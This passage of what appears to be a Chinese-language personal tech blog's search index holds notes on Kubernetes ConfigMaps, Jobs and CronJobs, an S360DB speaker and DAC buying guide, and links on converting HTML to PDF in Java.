--from-file=configure-pod-container/configmap/game.properties --from-file=configure-pod-container/configmap/ui.properties # 查看 ConfigMap 內容 kubectl describe configmaps game-config-2 Name: game-config-2 Namespace: default Labels: \u003cnone\u003e Annotations: \u003cnone\u003e Data ==== game.properties: ---- enemies=aliens lives=3 enemies.cheat=true enemies.cheat.level=noGoodRotten secret.code.passphrase=UUDDLRLRBABAS secret.code.allowed=true secret.code.lives=30 ui.properties: ---- color.good=purple color.bad=yellow allow.textmode=true how.nice.to.look=fairlyNice #Download the sample files into `configure-pod-container/configmap/` directory wget https://kubernetes.io/examples/configmap/game-env-file.properties -O configure-pod-container/configmap/game-env-file.properties # The env-file `game-env-file.properties` looks like below cat configure-pod-container/configmap/game-env-file.properties enemies=aliens lives=3 allowed=\"true\" # This comment and the empty line above it are ignored kubectl get configmap game-config-env-file -o yaml # apiVersion: v1 # kind: ConfigMap # metadata: # creationTimestamp: 2017-12-27T18:36:28Z # name: game-config-env-file # namespace: default # resourceVersion: \"809965\" # uid: d9d1ca5b-eb34-11e7-887b-42010a8002b8 # data: # allowed: '\"true\"' # enemies: aliens # lives: \"3\" 使用多個--from-env-file # Download the sample files into `configure-pod-container/configmap/` directory wget https://kubernetes.io/examples/configmap/ui-env-file.properties -O configure-pod-container/configmap/ui-env-file.properties # Create the configmap kubectl create configmap config-multi-env-files \\ --from-env-file=configure-pod-container/configmap/game-env-file.properties \\ --from-env-file=configure-pod-container/configmap/ui-env-file.properties kubectl get configmap config-multi-env-files -o yaml # apiVersion: v1 # kind: ConfigMap # metadata: # creationTimestamp: 2017-12-27T18:38:34Z # name: config-multi-env-files # namespace: default # resourceVersion: \"810136\" # uid: 252c4572-eb35-11e7-887b-42010a8002b8 # data: # color: purple # how: fairlyNice # textmode: \"true\" #kubectl create configmap game-config-3 --from-file=\u003cmy-key-name\u003e=\u003cpath-to-file\u003e kubectl create configmap game-config-3 --from-file=game-special-key=configure-pod-container/configmap/game.properties kubectl get configmaps game-config-3 -o yaml # apiVersion: v1 # kind: ConfigMap # metadata: # creationTimestamp: 2016-02-18T18:54:22Z # name: game-config-3 # namespace: default # resourceVersion: \"530\" # uid: 05f8da22-d671-11e5-8cd0-68f728db1985 # data: # game-special-key: | # enemies=aliens # lives=3 # enemies.cheat=true # enemies.cheat.level=noGoodRotten # secret.code.passphrase=UUDDLRLRBABAS # secret.code.allowed=true # secret.code.lives=30 指令內文 key kubectl create configmap special-config --from-literal=special.how=very --from-literal=special.type=charm kubectl get configmaps special-config -o yaml # apiVersion: v1 # kind: ConfigMap # metadata: # creationTimestamp: 2016-02-18T19:14:38Z # name: special-config # namespace: default # resourceVersion: \"651\" # uid: dadce046-d673-11e5-8cd0-68f728db1985 # data: # special.how: very # special.type: charm # Create a kustomization.yaml file with ConfigMapGenerator cat \u003c\u003cEOF \u003e./kustomization.yaml configMapGenerator: - name: game-config-4 files: - configure-pod-container/configmap/game.properties EOF kubectl apply -k . kubectl describe configmaps/game-config-4-m9dm2f92bt 定義 key Mapping 到 檔案 # Create a kustomization.yaml file with ConfigMapGenerator cat \u003c\u003cEOF \u003e./ku","date":"2021-03-03","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/:2:1","tags":["configmap"],"title":"Kubernetes 的 ConfigMap","uri":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/"},{"categories":["Kuberenetes"],"content":"在 Pod 使用 ConfigMap ","date":"2021-03-03","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/:3:0","tags":["configmap"],"title":"Kubernetes 的 ConfigMap","uri":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/"},{"categories":["Kuberenetes"],"content":"使用環境變數 kubectl create configmap special-config --from-literal=special.how=very apiVersion: v1 kind: Pod metadata: name: dapi-test-pod spec: containers: - name: test-container image: k8s.gcr.io/busybox command: [ \"/bin/sh\", \"-c\", \"env\" ] env: # Define the environment variable - name: SPECIAL_LEVEL_KEY valueFrom: configMapKeyRef: # The ConfigMap containing the value you want to assign to SPECIAL_LEVEL_KEY name: special-config # Specify the key associated with the value key: special.how restartPolicy: Never kubectl create -f https://kubernetes.io/examples/pods/pod-single-configmap-env-variable.yaml 使用多個 ConfigMap apiVersion: v1 kind: ConfigMap metadata: name: special-config namespace: default data: special.how: very --- apiVersion: v1 kind: ConfigMap metadata: name: env-config namespace: default data: log_level: INFO kubectl create -f https://kubernetes.io/examples/configmap/configmaps.yaml apiVersion: v1 kind: Pod metadata: name: dapi-test-pod spec: containers: - name: test-container image: k8s.gcr.io/busybox command: [ \"/bin/sh\", \"-c\", \"env\" ] env: - name: SPECIAL_LEVEL_KEY valueFrom: configMapKeyRef: name: special-config key: special.how - name: LOG_LEVEL valueFrom: configMapKeyRef: name: env-config key: log_level restartPolicy: Never kubectl create -f https://kubernetes.io/examples/pods/pod-multiple-configmap-env-variable.yaml TODO: https://kubernetes.io/docs/tasks/configure-pod-container/configure-pod-configmap/#define-container-environment-variables-with-data-from-multiple-configmaps ","date":"2021-03-03","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/:3:1","tags":["configmap"],"title":"Kubernetes 的 ConfigMap","uri":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/"},{"categories":["Kuberenetes"],"content":"cheatsheet kubectl apply -R -f intrudction/configmap kubectl get configmap kubectl get pods kubectl exec pods ls /tmp/config env ","date":"2021-03-03","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/:4:0","tags":["configmap"],"title":"Kubernetes 的 ConfigMap","uri":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/"},{"categories":["Kuberenetes"],"content":"同步時間 apiserver -\u003e kubelet -\u003e volume 一個箭頭 大約一分鐘 總共加起來需要兩分鐘。 ","date":"2021-03-03","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/:5:0","tags":["configmap"],"title":"Kubernetes 的 ConfigMap","uri":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/"},{"categories":["Kuberenetes"],"content":"env 安全性問題 取得 node 節點可以看到 container 環境設定變數問題 ","date":"2021-03-03","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/:6:0","tags":["configmap"],"title":"Kubernetes 的 ConfigMap","uri":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/"},{"categories":["Windows"],"content":"最近購買 S360DB 喇叭 有做一些筆記 方便以後來查詢 本內容是我從網路上整理的 因為我不是專業人士，特別整理網路上資訊 所以可能會有些錯誤 ","date":"2021-02-28","objectID":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/:0:0","tags":["s360db","spdif"],"title":"買S360DB喇吧與需不需要買 DAC 小記","uri":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/"},{"categories":["Windows"],"content":"我使用喇叭經歷 我以前用 N 牌塑膠便宜喇叭… 高中有用過三洋 1000 塊 木質喇叭 後來 ALTEC VS-4621 買(再特價3000時候買) 最近幾年看發現原來停產了… 所以當初5000~6000喇叭都降價 最近 ALTEC VS-4621 喇叭壞掉(左邊衛星喇叭沒聲音) 找不到哪邊有修理，只能換喇叭 最近換 S360DB 喇叭 ","date":"2021-02-28","objectID":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/:1:0","tags":["s360db","spdif"],"title":"買S360DB喇吧與需不需要買 DAC 小記","uri":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/"},{"categories":["Windows"],"content":"喇叭推薦選擇 建議還是看【心得】0~10萬 個人偏愛喇叭推薦 購買 基礎概念分享~ @電腦應用綜合討論 哈啦板 - 巴哈姆特 專業又豐富… 我桌子比較大，所以我選擇 S360DB 雖然放這兩顆還是感覺很大 不過買的時候，建議看一下重低音是否放得下 重低音深度還滿大的… 我朋友因為桌子比較小，選 Aego 3 2.1 實體店我是去勝鋒光華喇叭專賣店 那邊襬的喇叭還算不錯 老闆還算滿專業 我朋友挑 Aego 3 2.1 老闆有講這個喇叭缺點電腦關機會有抵躁(老闆自己講的) 跟網路上講得一樣，線材可以升級還有保固 這邊簡單說一下，我使用 S360DB 感想 目前剛來的時候， 30%音量就覺得很大聲 所以怕吵的可能不推薦買這種喇叭 因為這種喇叭要開大聲比較好 然後 玩遊戲、看電影我會開 50% 音量(電腦的) 音樂聽 Hi-RES 音質比較好 遊戲環繞超讚，看動畫影片聲音分離很開 是一種不同的感受，聽得很有環繞效果 缺點嗎? 喇叭看不到轉多少音量，其實我以前還滿固定看喇叭旋轉音量 但現在無法看到，說明書也沒說明，有問客服有無法看的方法 1.喇叭聲音的段數是屬於微調性質 因此沒有特別分段 2.看不到調多大 說明：當喇叭連接手機藍芽，這時音量會跟手機連動，也就是只有一個音量控制，不會手機音量開到80%，喇叭音量開到30%的多頭馬車現象。 ","date":"2021-02-28","objectID":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/:2:0","tags":["s360db","spdif"],"title":"買S360DB喇吧與需不需要買 DAC 小記","uri":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/"},{"categories":["Windows"],"content":"可能要懂得喇叭知識 ","date":"2021-02-28","objectID":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/:3:0","tags":["s360db","spdif"],"title":"買S360DB喇吧與需不需要買 DAC 小記","uri":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/"},{"categories":["Windows"],"content":"被動式喇叭和主動式喇叭 喇叭分為主動與被動 其最大差異為 是否內置擴大電路～ 主動式喇叭內建擴大機（電路） 因此只要有 音源(類比聲音) 或是訊源( 數位 例如光纖 同軸 USB介面….注意不是所有主動式都內建dac) 即可發聲….. 被動式喇叭 代表必須額外接擴大機 DAC 線材…等等 （前端器材得以外接） 因此用料與價格等級規格可以依據自己口袋深度大幅度提高…..所以音質可提升空間主動式喇叭 參考: 【心得】0~10萬 個人偏愛喇叭推薦 購買 基礎概念分享~ @電腦應用綜合討論 哈啦板 - 巴哈姆特 ","date":"2021-02-28","objectID":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/:3:1","tags":["s360db","spdif"],"title":"買S360DB喇吧與需不需要買 DAC 小記","uri":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/"},{"categories":["Windows"],"content":"RCA 簡單來說就是1(3.5mm) 轉 2同軸 Google 一下應該就知道 ","date":"2021-02-28","objectID":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/:3:2","tags":["s360db","spdif"],"title":"買S360DB喇吧與需不需要買 DAC 小記","uri":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/"},{"categories":["Windows"],"content":"DAC,DDC,音效卡,SPDIF 專業文【心得】迷思破解 音效卡? DAC?耳擴(擴大機)? 電源?聲音好壞?數位化聲音? @電腦應用綜合討論 哈啦板 - 巴哈姆特 我其實看不是很懂…(冒汗) DAC,DDC,音效卡 之前看影片，我覺得 DAC 和音效卡就是一樣的東西 網路上還是有找到差異 問:USB DAC是否可以取代音效卡? 答:不能完全取代!因為一般USB DAC無如MIC/LINE IN等功能 如果不使用麥克風或類比輸入的情況下 你只是要單純接NB或PC聽2聲道音樂就可以算取代音效卡 問:DAC是否可以取代音效卡? 答:DAC無法取代音效卡~因為DAC不是要取代音效卡 DAC需要接音效卡的數位訊號輸出轉出類比2聲道 提升原本聲音的品質~彼此是搭配互補的關係! 參考: 音樂達人專業賣場 DDC 目前看好像沒有解音效卡功能 在USB DAC 沒普及之前 中間需要用這個樣子 如我下面想找 USB DDC 但沒找到 有些音效卡上面有 SPDIF 輸出 代表有 DDC 功能(我看到有偏有人這樣講) SPDIF 光纖 光華找不到 露天也只剩一家在賣… 我當初看 SPDIF 一直以為音效卡上面有 SPDIF 就以為音效卡會處理 但其實裝置輸入再SPDIF 輸出，音效卡不會做額外加工 可能送到喇叭 SPDIF 裡面會是最好的方案 光纖要注意線的頻率，對應喇叭和 DAC 是否有支援 如: 24bit/192歐 ","date":"2021-02-28","objectID":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/:3:3","tags":["s360db","spdif"],"title":"買S360DB喇吧與需不需要買 DAC 小記","uri":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/"},{"categories":["Windows"],"content":"正常喇叭轉換過程 圖示參考: 亞當開箱｜音效卡分享 SoundBlaster G6、X3，聆聽模式\u0026均衡響度，吃雞神器！ - YouTube 推薦可以看一下上面影片 ","date":"2021-02-28","objectID":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/:3:4","tags":["s360db","spdif"],"title":"買S360DB喇吧與需不需要買 DAC 小記","uri":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/"},{"categories":["Windows"],"content":"喇叭需要關機嗎? 之前我使用 vs4621 我就沒有關機 因為他做那邊不好關機 網路上也有正反兩派 這次我問店家老闆，老闆說正常不到 100wa 的喇叭可以不用 e235 重低音就需要關，老闆說他的 wa 數比較高，關掉才比較不會發熱 ","date":"2021-02-28","objectID":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/:3:5","tags":["s360db","spdif"],"title":"買S360DB喇吧與需不需要買 DAC 小記","uri":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/"},{"categories":["Windows"],"content":"S360DB 整理 ","date":"2021-02-28","objectID":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/:4:0","tags":["s360db","spdif"],"title":"買S360DB喇吧與需不需要買 DAC 小記","uri":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/"},{"categories":["Windows"],"content":"該不該買 DAC 先講結論，不推薦 當初買 S360DB 很怕喇叭推不動 所以有再看是否要買音效卡 後來查了一推資料 原本想購買如下順續 SPDIF(1) =\u003e ASUS 音效卡(2) =\u003e G6(3)=\u003e 放棄購買 DAC (4) –\u003e DDC(5) (1) 當初想買這個，想說主機板有支援 想說直接數位輸出，但這個要拆主機板 這點我就很懶… 因為我家插座沒接地線 所以怕會引響喇叭有雜音… 之前 3.5mm 喇叭現有特別換大通線 減少雜音 (2) 聽說買這個，通常音效卡有做電力保護 所以比較不會聽到雜音 但網路上找不到 ASUS 配 S360DB (3)-\u003e(4) 看這篇有推薦亞當開箱｜音效卡分享 SoundBlaster G6、X3，聆聽模式\u0026均衡響度，吃雞神器！ - YouTube 這個 G6 和 S360DB 在巴哈就有人討論是否要搭著用 【問題】請問一下外接G6音效卡的問題… @電腦應用綜合討論 哈啦板 - 巴哈姆特 這篇還滿值的參考 有兩個大神在激辯，不過當時看這篇還看不是很懂 反正最後不推薦使用 DAC RE:音效卡 資訊整合 分享 @電腦應用綜合討論 哈啦板 - 巴哈姆特 第 18 樓可以參考 Re: [問題] 光纖和3.5真的有差嗎？ - 看板 Audiophile - 批踢踢實業坊 【閒聊】關於漫步者喇叭的一些雜談與音效卡/DAC購置與否~ @電腦應用綜合討論 哈啦板 - 巴哈姆特 (5) 後來，我還是很想知道光纖音質 想說有沒有 USB 兔出光纖 後來有找到 1000 塊這種，但規格只有到 16/48歐 買不對頻率會降頻(參考:[討論] DDC跟DAC解析不同 以哪個為主？ - 看板 Headphone - 批踢踢實業坊) 喇叭有支援到 24/192歐 後來疑似有找到有支援的 CYP西柏 - 專業級 192KHz 高音質USB轉光纖 (Optical) 轉換盒 CDB-6 - PChome 24h購物 第二代 XMOS XU208異步 USB轉同軸光纖數字界面 1000MIPS DSD256 | 露天拍賣 但文獻太少…又不便宜，所以我放棄 **最後還是乖乖用 RCA ** 最後有爬到有一個 DDC 比較有文獻 谷津 DA\u0026T C14 谷津 U1 \u0026 c-11(usb轉同軸) \u0026 電源濾波器 - Mobile01 題外話，我朋友是站在買 DAC 這一塊 聲音多多少少傳到 S360DB 轉換一次還是不一樣(但網路上說CP質不高) 我朋友之前有買 SONY PHA-1A 他覺得音樂有變比較好(以上存個人感受) 但我覺得大多文獻都是不推薦的，因為變化不大 假如你覺得不好可以買買看 看著看著 SONY PHA-1A 停產啦，好像CP直比較高的DAC 是 Q5S(能USB接電腦，開藍芽走LDAC…) 國外有USB type c 版本，台灣沒有賣的樣子 這又是另一個坑，目前還沒打算買 最近花了很多心力在研究 把一些重點都記錄出來 怕我下次買喇叭又要重新找資料 希望能順便幫到有要買的人 ","date":"2021-02-28","objectID":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/:4:1","tags":["s360db","spdif"],"title":"買S360DB喇吧與需不需要買 DAC 小記","uri":"/blog/posts/%E8%B2%B7S360DB%E5%96%87%E5%90%A7%E8%88%87%E9%9C%80%E4%B8%8D%E9%9C%80%E8%A6%81%E8%B2%B7-DAC-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"TODO: 整理 haopenge/freemark-html-xhtml-pdf: freemark-html-xhtml-pdf ，从名称可以看出此项目是三者之间的转换，用于生成pdf 文件的 freemarker生成html、html轉pdf、pdf根據關鍵字定位、pdf簽名 - IT閱讀 java通过html生成pdf,支持css和图片以及横向打印 - 林宇风 - 博客园 java通过html生成pdf,支持css和图片以及横向打印 - 林宇风 - 博客园 xhtmlrenderer + iText-HTML转PDF_hunan961的博客-CSDN博客_xhtmlrenderer itext将html转为pdf,图片标签为base64的处理 - 小翔的个人空间 - OSCHINA - 中文开源技术交流社区 itext将html转为pdf,图片标签为base64的处理 - 小翔的个人空间 - OSCHINA - 中文开源技术交流社区 ","date":"2021-02-23","objectID":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-freemarker-ftl-XHTML-%E8%BD%89-PDF/:0:0","tags":["java","freemarker","ftl"],"title":"Java 使用 freemarker (ftl) XHTML 轉 PDF","uri":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-freemarker-ftl-XHTML-%E8%BD%89-PDF/"},{"categories":["Java"],"content":"中文看不見問題(字型) 解决PDF添加水印报错iText： Font ‘STSong-Light’ with ‘UniGB-UCS2-H’ is not recognized_HaHa_Sir的博客-CSDN博客 JWorld@TW Java論壇 - iText RtfShape 內文為中文會出現亂碼 iText - PsMonkey 隨手筆記 Java iText+FreeMarker生成PDF(HTML转PDF) - 云飞扬-88 - 博客园 iText 解決中文問字型問題 顯示中文 | 程式前沿 簡單說明一下，我這邊使用方法不是載入程式內部字型 是使用 jar 裡面自型解決解决PDF添加水印报错iText： Font ‘STSong-Light’ with ‘UniGB-UCS2-H’ is not recognized_HaHa_Sir的博客-CSDN博客 1、itext 經歷了從： itext.itext —\u003e com.lowagie —\u003e com.itextpdf 的三次升級，若使用了舊版本的jar，就會出現錯誤，還不好發現。 2、多從maven repository 搜索下相關jar包，關注組件的歷史變化情況。 3、會debeug，會追蹤源碼，找到拋出異常的根本原因所在！ 這邊找相對應java 版本，所以把itext-asian升到 5.2 就可以跑了 後來對應網路上字型都不能跑(會亂碼)， 猜測是簡體字型關係，看到JWorld@TW Java論壇 - iText RtfShape 內文為中文會出現亂碼 bfChinese = BaseFont.createFont(\"MHei-Medium\", \"UniCNS-UCS2-H\", BaseFont.NOT_EMBEDDED); 就可以跑出中文字，感動QQ 後來發現用 Android 中文會看不到 可能用標楷體會能解決 ","date":"2021-02-23","objectID":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-freemarker-ftl-XHTML-%E8%BD%89-PDF/:1:0","tags":["java","freemarker","ftl"],"title":"Java 使用 freemarker (ftl) XHTML 轉 PDF","uri":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-freemarker-ftl-XHTML-%E8%BD%89-PDF/"},{"categories":["Java"],"content":"圖片(base64) ","date":"2021-02-23","objectID":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-freemarker-ftl-XHTML-%E8%BD%89-PDF/:2:0","tags":["java","freemarker","ftl"],"title":"Java 使用 freemarker (ftl) XHTML 轉 PDF","uri":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-freemarker-ftl-XHTML-%E8%BD%89-PDF/"},{"categories":["Java"],"content":"轉 xhtml ","date":"2021-02-23","objectID":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-freemarker-ftl-XHTML-%E8%BD%89-PDF/:3:0","tags":["java","freemarker","ftl"],"title":"Java 使用 freemarker (ftl) XHTML 轉 PDF","uri":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-freemarker-ftl-XHTML-%E8%BD%89-PDF/"},{"categories":["Java"],"content":"別人範例 一次java导出pdf的经历 - mickey007 - 博客园 Java生成pdf文件或jpg图片 - 简书 ","date":"2021-02-23","objectID":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-freemarker-ftl-XHTML-%E8%BD%89-PDF/:4:0","tags":["java","freemarker","ftl"],"title":"Java 使用 freemarker (ftl) XHTML 轉 PDF","uri":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-freemarker-ftl-XHTML-%E8%BD%89-PDF/"},{"categories":["Java"],"content":"別的方法 jhonnymertz/java-wkhtmltopdf-wrapper: A Java wrapper for wkhtmltopdf ","date":"2021-02-23","objectID":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-freemarker-ftl-XHTML-%E8%BD%89-PDF/:5:0","tags":["java","freemarker","ftl"],"title":"Java 使用 freemarker (ftl) XHTML 轉 PDF","uri":"/blog/posts/Java-%E4%BD%BF%E7%94%A8-freemarker-ftl-XHTML-%E8%BD%89-PDF/"},{"categories":["Kubernetes"],"content":"直接進入重點 ","date":"2021-02-22","objectID":"/blog/posts/Kuberenetes-%E7%9A%84-Job/:0:0","tags":["kubernetes","job"],"title":"Kubernetes 的 Job","uri":"/blog/posts/Kuberenetes-%E7%9A%84-Job/"},{"categories":["Kubernetes"],"content":"Job 會結束的程式。不會結束的會稱為Daemon。 ","date":"2021-02-22","objectID":"/blog/posts/Kuberenetes-%E7%9A%84-Job/:1:0","tags":["kubernetes","job"],"title":"Kubernetes 的 Job","uri":"/blog/posts/Kuberenetes-%E7%9A%84-Job/"},{"categories":["Kubernetes"],"content":"執行方式 ","date":"2021-02-22","objectID":"/blog/posts/Kuberenetes-%E7%9A%84-Job/:2:0","tags":["kubernetes","job"],"title":"Kubernetes 的 Job","uri":"/blog/posts/Kuberenetes-%E7%9A%84-Job/"},{"categories":["Kubernetes"],"content":"Completions/Parallelism Completions: 啟動任務要執行幾次 Parallelism: 同時間執行幾個程式 Job Completions: 2 , Parallelism: 1 graph A[Job Completions: 2 , Parallelism: 1] --\u003e|Step.1| B[建立 Pod] B --\u003e |Step.2| C[Pod執行中] C --\u003e |Step.3| D[Pod 執行完成] D --\u003e|Step.4 Observe| A A --\u003e |Step.5| B1[建立 Pod] B1 --\u003e |Step.6|C1[Pod執行中] C1 --\u003e |Step.7|D1[Pod 執行完成] D1 --\u003e|Step.8 Observe| A Job Completions: 2 , Parallelism: 2 用程式觀點，簡單說就是2個執行緒執行`，同時間執行兩個工作。 graph A[Job Completions: 2 , Parallelism: 2] --\u003e|Step1.1| B[建立 Pod] B --\u003e |Step-1.2| C[Pod執行中] C --\u003e |Step-2.3| D[Pod 執行完成] D --\u003e|Step-1.4 Observe| A A --\u003e |Step-2.1| B1[建立 Pod] B1 --\u003e |Step-2.2|C1[Pod執行中] C1 --\u003e |Step-2.3|D1[Pod 執行完成] D1 --\u003e|Step-2.4 Observe| A 上面圖片Step1,Step2 是一起做的。我多加一個Thread 來表示可能會比較清楚。 graph ST[StartJob] --\u003e |Step-1 and 2|B \u0026 B1 subgraph thread1 B[建立 Pod] --\u003e |Step-1.2| C[Pod執行中] C --\u003e |Step-1.3| D[Pod 執行完成] end subgraph thread2 B1[建立 Pod] --\u003e |Step-2.2|C1[Pod執行中] C1 --\u003e |Step-2.3|D1[Pod 執行完成] end D \u0026 D1 --\u003e END[EndJob] ","date":"2021-02-22","objectID":"/blog/posts/Kuberenetes-%E7%9A%84-Job/:2:1","tags":["kubernetes","job"],"title":"Kubernetes 的 Job","uri":"/blog/posts/Kuberenetes-%E7%9A%84-Job/"},{"categories":["Kubernetes"],"content":"backofflimit 跑失敗幾次就不跑 ","date":"2021-02-22","objectID":"/blog/posts/Kuberenetes-%E7%9A%84-Job/:2:2","tags":["kubernetes","job"],"title":"Kubernetes 的 Job","uri":"/blog/posts/Kuberenetes-%E7%9A%84-Job/"},{"categories":["Kubernetes"],"content":"activeDeadLineSeconds 執行超過多久會自動關閉，Pod狀態會變成failed。 ","date":"2021-02-22","objectID":"/blog/posts/Kuberenetes-%E7%9A%84-Job/:2:3","tags":["kubernetes","job"],"title":"Kubernetes 的 Job","uri":"/blog/posts/Kuberenetes-%E7%9A%84-Job/"},{"categories":["Kubernetes"],"content":"Tree Job-\u003ePod* ","date":"2021-02-22","objectID":"/blog/posts/Kuberenetes-%E7%9A%84-Job/:2:4","tags":["kubernetes","job"],"title":"Kubernetes 的 Job","uri":"/blog/posts/Kuberenetes-%E7%9A%84-Job/"},{"categories":["Kubernetes"],"content":"官方實例 apiVersion: batch/v1 kind: Job metadata: name: pi spec: template: spec: containers: - name: pi image: perl command: [\"perl\", \"-Mbignum=bpi\", \"-wle\", \"print bpi(2000)\"] restartPolicy: Never backoffLimit: 4 kubectl apply -f https://kubernetes.io/examples/controllers/job.yaml ","date":"2021-02-22","objectID":"/blog/posts/Kuberenetes-%E7%9A%84-Job/:3:0","tags":["kubernetes","job"],"title":"Kubernetes 的 Job","uri":"/blog/posts/Kuberenetes-%E7%9A%84-Job/"},{"categories":["Kubernetes"],"content":"自動清理 完成 100 秒就會清除，我在 kind 沒有效果… FEATURE STATE: Kubernetes v1.12 [alpha] 可能我的環境還不支援?? apiVersion: batch/v1 kind: Job metadata: name: pi-with-ttl spec: ttlSecondsAfterFinished: 100 template: spec: containers: - name: pi image: perl command: [\"perl\", \"-Mbignum=bpi\", \"-wle\", \"print bpi(2000)\"] restartPolicy: Never ","date":"2021-02-22","objectID":"/blog/posts/Kuberenetes-%E7%9A%84-Job/:4:0","tags":["kubernetes","job"],"title":"Kubernetes 的 Job","uri":"/blog/posts/Kuberenetes-%E7%9A%84-Job/"},{"categories":["Kubernetes"],"content":"Crontab apiVersion: batch/v1beta1 kind: CronJob metadata: name: hello spec: schedule: \"*/1 * * * *\" jobTemplate: spec: template: spec: containers: - name: hello image: busybox imagePullPolicy: IfNotPresent args: - /bin/sh - -c - date; echo Hello from the Kubernetes cluster restartPolicy: OnFailure ","date":"2021-02-22","objectID":"/blog/posts/Kuberenetes-%E7%9A%84-Job/:5:0","tags":["kubernetes","job"],"title":"Kubernetes 的 Job","uri":"/blog/posts/Kuberenetes-%E7%9A%84-Job/"},{"categories":["Kubernetes"],"content":"Queue Work 使用工作队列进行粗粒度并行处理 | Kubernetes 详解 Kubernetes Job 和 CronJob 的实现原理 - 面向信仰编程 